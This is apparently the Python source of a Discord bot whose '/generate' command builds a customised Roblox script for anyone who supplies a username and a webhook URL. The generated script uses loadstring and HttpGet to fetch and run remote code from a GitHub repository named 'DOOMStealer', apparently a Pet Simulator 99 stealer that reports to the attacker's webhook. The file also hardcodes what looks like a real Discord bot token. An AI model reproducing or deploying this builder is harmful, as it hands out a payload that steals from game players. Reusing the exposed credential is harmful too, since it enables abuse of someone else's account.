import discord
from discord import app_commands
from discord.ext import commands

TOKEN = 'MTM5MjgzMzUwNjM1MDIwMjkyMA.GSQ1TK.itQP0IcPzALyHuEJNI87LlsXaPc0tgS8Ptgdps'

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# Template from uploaded file
TEMPLATE = '''Username = "{username}"
Webhook = "{webhook}"

loadstring(game:HttpGet("https://raw.githubusercontent.com/DOOMStealer/DOOM/refs/heads/main/PS99"))()
'''

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands.")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

@bot.tree.command(name="generate", description="Fill in Username and Webhook in the script")
@app_commands.describe(username="Your Username", webhook="Your Webhook URL")
async def generate(interaction: discord.Interaction, username: str, webhook: str):
    filled_script = TEMPLATE.format(username=username, webhook=webhook)

    with open("generated_script.txt", "w") as f:
        f.write(filled_script)

    await interaction.response.send_message(
        "Here is your customized script:",
        file=discord.File("generated_script.txt")
    )

bot.run(TOKEN)
